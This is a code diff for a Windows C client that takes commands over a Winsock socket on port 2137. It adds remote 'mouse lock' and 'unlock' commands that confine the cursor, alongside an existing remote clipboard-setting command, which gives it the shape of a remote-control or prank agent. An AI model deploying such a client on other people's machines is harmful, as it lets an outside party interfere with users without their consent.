@@ -11,7 +11,19 @@
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_PORT "2137"
 WSADATA wsaData;
+int lockMouse()
+{
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
 
+    RECT lockRect;
+    lockRect.left = screenWidth / 4;
+    lockRect.top = screenHeight / 4;
+    lockRect.right = 3 * screenWidth / 4;
+    lockRect.bottom = 3 * screenHeight / 4;
+
+    return ClipCursor(&lockRect);
+}
 int setClipboardText(const char *text) {
     // Open the clipboard
     if (OpenClipboard(NULL)) {
@@ -224,13 +236,29 @@ int main()
                 msg.header = RESPONSE_FAILED;
             else
                 msg.header = RESPONSE_OK;
-
             memset(msg.payload, 0, 512);
             msg.hasNext = NEXT_FALSE;
             send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
-
-
-
+        }
+        if(msg.header == SIGNAL_MOUSE_LOCK)
+        {
+            if(!lockMouse())
+                msg.header = RESPONSE_FAILED;
+            else
+                msg.header = RESPONSE_OK;
+            memset(msg.payload, 0, 512);
+            msg.hasNext = NEXT_FALSE;
+            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
+        }
+        if(msg.header == SIGNAL_MOUSE_UNLOCK)
+        {
+            if(!ClipCursor(NULL))
+                msg.header = RESPONSE_FAILED;
+            else
+                msg.header = RESPONSE_OK;
+            memset(msg.payload, 0, 512);
+            msg.hasNext = NEXT_FALSE;
+            send(ConnectSocket, (char *)&msg, sizeof(MESSAGE ), 0);
         }
     }
     closesocket(ConnectSocket);
